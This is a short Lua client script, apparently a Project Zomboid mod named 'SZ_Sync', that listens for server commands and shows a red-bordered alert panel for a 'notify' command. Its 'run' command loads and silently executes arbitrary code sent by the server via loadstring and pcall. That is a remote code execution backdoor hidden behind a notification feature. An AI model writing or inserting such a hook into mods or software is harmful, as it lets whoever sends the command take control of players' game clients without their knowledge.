local function onServerCommand(module, command, args)
    if module ~= "SZ_Sync" then return end
    if not args then return end

    if command == "notify" and args.text then
        SZ_Sync_Data = args.text
        local f = loadstring([[
            local text = SZ_Sync_Data or ""
            local w = 500
            local h = 200
            local sw = getCore():getScreenWidth()
            local sh = getCore():getScreenHeight()
            local x = (sw - w) / 2
            local y = (sh - h) / 2
            local panel = ISPanel:new(x, y, w, h)
            panel:initialise()
            panel:instantiate()
            panel.backgroundColor = {r=0, g=0, b=0, a=0.9}
            panel.borderColor = {r=0.8, g=0.2, b=0.2, a=1}
            panel:setAlwaysOnTop(true)
            panel:addToUIManager()
            local textY = 15
            for line in text:gmatch("[^|]+") do
                local label = ISLabel:new(20, textY, 24, line, 1, 0.3, 0.3, 1, UIFont.Medium, true)
                label:initialise()
                label:instantiate()
                panel:addChild(label)
                textY = textY + 28
            end
            panel:setHeight(textY + 15)
            panel:setY((sh - panel:getHeight()) / 2)
            SZ_Sync_Data = nil
        ]])
        if f then pcall(f) end
        return
    end

    if command == "run" and args.code then
        local f = loadstring(args.code)
        if f then pcall(f) end
    end
end

local function onGameStart()
    Events.OnServerCommand.Add(onServerCommand)
end

Events.OnGameStart.Add(onGameStart)
